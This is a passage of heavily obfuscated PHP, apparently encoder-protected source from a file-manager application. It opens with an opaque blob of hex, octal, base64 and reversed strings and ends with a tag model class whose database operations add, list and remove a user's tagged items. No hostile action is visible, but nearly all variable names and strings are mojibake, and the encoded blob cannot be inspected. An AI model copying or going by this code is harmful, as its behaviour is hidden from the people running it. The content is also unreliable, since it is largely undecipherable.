\53\46"."\x98\x78\xee\x99\x14\x7d\x20\xb\x53\x82\x45\x44\xcc\x61\x49\xca\xc1\x37\x21\xcb\x29\x68\x49\x14\xa7\x87\x3f\xb2\xe9\xb2\xbe\x19\x49\x6a\x34\xdb\x5e\x17\xc2\x85\xc\x71\x6e\x2d\xd2"."\344\334\373\330\334\332\154\63\213\125\240\202\246\125\46\303\36\52\54\263\277\134\70\316\231\373\61\254\37\15\345\11\1\310\361\123\200\104\27\16\350\102\60\117\35"."\xbc\x2d\x83\xbc\xcc\x10\xe0\x9f\x7f\x13\xb2\x67\x26\x5\x46\x18\x84\xc4\xf1\xd2\xcd\xdc\xaa\x6b\x88\x14\xb3\xa6\x32\xa9\x86\xa0\x0\x27\xbc\x9a\x97\xf3\x92\x97\x4d\x70\xf\xd8\x23".strrev('µ]ĞFÔÕ±!Ñˆ±¡¶4éicL™­Šğ½ÔHø©¹­°v&wÈj¥“~')."\146\100\145\143\353\116\231\236\257\130\124\323\15\241\30\113\317\127\26\76\226\146\132\146\223\73\64\265\73\62\105\254\60\346\156\55\114\56\271\66\24\223\204\133\65"."\100\336\306\254\156\223\121\46\112\246\216\232\350\323\306\374\136\310\172\55\307\274\105\346\140\252\214\332\44\144\243\132\324\325\7\370\205\26\105\76\156\121\215\262\261".base64_decode('NNvTJ5v0csteq83CSwiXeFEEO97cexp+fSQc/rQaZEY4rrWlC8ifYzu5j1/N')."\x70\xea\x37\x16\x63\xef\x5f\x5a\x8a\xc6\x28\xfd\xcf\x52\x41\xa\x7f\x2a\x13\xd2\x3a\x82\x91\x22\x57\x75\x55\xfa\xed\x4f\xb2\xb9\x44\xc3\x46\x4b\xc1\xdc\x54\x6e\xc4\x68\x1f\x17\xda"."\xb\x16\xe7\xc8\x2e\xd1\xfa\x91\x41\xb\x4f\xc2\x4e\x6b\x99\xc6\x89\xc0\x42\x40\x75\x6d\xae\x8a\x82\xfb\xc8\x18\x64\xfe\x49\xab\xad\x25\x2b\xc6\x16\x3\x94\x41\xca\xf1\x4e\x4b\xaa".base64_decode('jSmC4gZ6PtuyDPHNTuulm8ixC2urJJqE5sQLuSErBPN/hIObdYoFu1SeQU8h').base64_decode('zTL5AhZjAyMlA2KmpTv2pUX0PIdLnJhEEk0XlRDnlldsvRcr2EeGaxj9qhmN').strrev('©hq¥—¡g'."\r".'[Ê=ÁÔòÒ«péÉÅë;SïkûùCä©3ºnfnFL')."\x3b\xc4\x14\xc0\xba\x38\xb\xd6\xcd\xc9\xa6\x95\x5\x99\x85\x50\xcf\x94\x33\xc6\x10\xc3\xcb\x9d\x3c\xc2\xbe\xc7\xf2\xc\xd8\xc6\xe4\xe2\xa2\x43\xcd\x67\xde\xc2\xb9\x9f\x23\x10\x67".base64_decode('L434/fy94Gy67eY0Xy/yFh6yF3leyyXurPIgUZqTB23ya/ZcBM3z8lz64zbh')."\xe1\x2b\x7a\x4f\xc9\x93\x2d\x6a\x10\xe4\xd7\x31\x8\xe4\xdd\xfa\x86\xf5\xf2\xdf\x96\x2e\x4e\xc\x55\x4\x2\xac\x18\x7f\x3f\x56\xd0\x46\x1d\x63\x41\xe9\x99\x54\x4f\x8a\x5a\x60\x80".base64_decode('1rm6FtTGZK+sss/ltGYFzVRGULPMqxzrQG9w57CoCfp6hahXjNkRzVSjggKS').strrev(' PnÊ™xZ´Ûã£;Æ²Ñlš\\aĞ‰(>ÄyÏ-ãg¡6k$’?OœqÕı')."\xdf\xe4\xc0\xe7\x25\xce\x86\xcf\xa0\x3b\x60\x5e\x48\x4b\xa3\xdf\x1a\xcd\x34\x29\x26\x1\x8c\x3d\x2a\x89\xa8\x37\x78\xe8\x39\x4\xe5\x3\x10\xe2\xd7\x25\x70\x16\x91\x4\x1f\x81\x23"."\102\33\50\110\356\365\40\47\31\124\160\56\102\66\226\10\274\31\140\21\361\114\43\227\161\365\31\333\215\42\117\0\334\141\104\33\240\256\312\240\41\47\357\17\177"."\234\125\266\123\150\134\5\200\300\233\250\112\201\314\145\15\67\316\161\23\177\257\116\324\206\223\370\10\351\116\167\131\252\143\227\363\114\205\360\367\132\40\102\107\336"."\4\366\3\211\344\105\320\43\252\167\226\57\30\12\346\144\265\172\202\301\166\177\240\16\273\215\314\311\106\265\4\255\225\234\254\326\106\177\313\120\171\336\146\217\257"."\51\47\17\152\261\264\204\271\147\33\234\345\153\105\275\364\64\65\371\333\207\352\205\257\166\6\357\11\272\63\345\122\355\164\134\243\42\152\52\374\17\312\11\312\44"."\xb\x6\x5e\x4a\x92\xbb\x38\xe2\x75\xac\xbc\xbf\xb8\xae\x6\xf5\xf7\xc5\x2\x56\xe7\xea\x36\x85\x32\xa\xb0\xa4\x21\xa8\x81\xd2\x42\xda\xe\xa4\x49\x2a\x74\xa3\xc9\x36\x37\xa3\x82"."\321\200\64\233\242\73\276\25\166\131\256\222\205\164\264\131\20\212\21\200\120\74\135\121\102\111\336\31\23\5\243\271\202\172\224\313\147\4\366\364\54\215\350\74\165".base64_decode('axFBEI+ZEmJ9ReZYUDvCYZL9fwBMrpB2QZwAAA=='), 10, -8))); goto B¡Ö­‘Í¶; F‹—ñ‰ğØ…: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\145\162\x5f\x66\x61\166"; protected function cacheFunctionAlias($eÅ«‚„îô) { $C—êÔìÎ =& $_SERVER[Ïº«‚ßèÔˆø]; return array($C—êÔìÎ[1773] => array(USER_ID, $C—êÔìÎ[1774])); } protected function listData() { $bÖ»”šø‚Ö =& $_SERVER[Ïº«‚ßèÔˆø]; $A«ôÛ†²¨µ = array($bÖ»”šø‚Ö[1500] => USER_ID, $bÖ»”šø‚Ö[461] => array($bÖ»”šø‚Ö[1777], 0)); $eÌ•§±‘Ğ = $bÖ»”šø‚Ö[1779]; $cÔÀ‹ê×÷› = $this->field($eÌ•§±‘Ğ)->where($A«ôÛ†²¨µ)->order($bÖ»”šø‚Ö[1780])->select(); return $cÔÀ‹ê×÷› ? $cÔÀ‹ê×÷› : array(); } protected function listByTag($cùèæëÜ×) { } protected function addToTag($f™©á×¿¬, $bÜå²‘“·×) { $fÜ‹™¸í =& $_SERVER[Ïº«‚ßèÔˆø]; if (!Model($fÜ‹™¸í[1915])->listData($bÜå²‘“·×) || !Model($fÜ‹™¸í[782])->pathInfo($f™©á×¿¬)) { return !1; } $dåÚ†ªÒÂ¢ = array($fÜ‹™¸í[1500] => USER_ID, $fÜ‹™¸í[461] => $bÜå²‘“·×, $fÜ‹™¸í[412] => $f™©á×¿¬, $fÜ‹™¸í[413] => $fÜ‹™¸í[407], $fÜ‹™¸í[411] => $fÜ‹™¸í[33], $fÜ‹™¸í[1675] => 0); if ($this->where($dåÚ†ªÒÂ¢)->find()) { return !1; } return $this->add($dåÚ†ªÒÂ¢); } protected function removeFromTag($cõ³¢¯¤¿Ë, $Dƒ…¼· ¤‰) { $D¹®Ë¯Äöí =& $_SERVER[Ïº«‚ßèÔˆø]; if (!Model($D¹®Ë¯Äöí[1915])->listData($Dƒ…¼· ¤‰)) { return !1; } if (is_array($cõ³¢¯¤¿Ë)) { $cõ³¢¯¤¿Ë = array($D¹®Ë¯Äöí[7], $cõ³¢¯¤¿Ë); } $aº‡œ¨â«È = array($D¹®Ë¯Äöí[1500] => USER_ID, $D¹®Ë¯Äöí[461] => $Dƒ…¼· ¤‰, $D¹®Ë¯Äöí[413] => $D¹®Ë¯Äöí[407], $D¹®Ë¯Äöí[412] => $cõ³¢¯¤¿Ë); return $this->where($aº‡œ¨â«È)->delete(); } protected function removeByTag($aÊ°«Ã…Õ) { $EÂËÈæÂã =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$aÊ°«Ã…Õ) { return !1; } $aÂ²¢©ÌÁ = array($EÂËÈæÂã[1500] => USER_ID, $EÂËÈæÂã[461] => $aÊ°«Ã…Õ); return $this->where($aÂ²¢©ÌÁ)->delete(); } protected function removeBySource($dĞÃã¶‹æö) { $aõÏ´±‹Ìİ =& $_SERVER[Ïº«‚ßèÔˆø]; if (is_array($dĞÃã¶‹æö)) { $dĞÃã¶‹æö = array($aõÏ´±‹Ìİ[7], $dĞÃã¶‹æö); } $d¤Õ»È“‰É = array($aõÏ´±‹Ìİ[1500] => USER_ID, $aõÏ´±‹Ìİ[412] => $dĞÃã¶‹æö, $aõÏ´±‹Ìİ[461] => array($aõÏ´±‹Ìİ[955], 0)); return $this->where($d¤Õ»È“‰É)->delete(); } }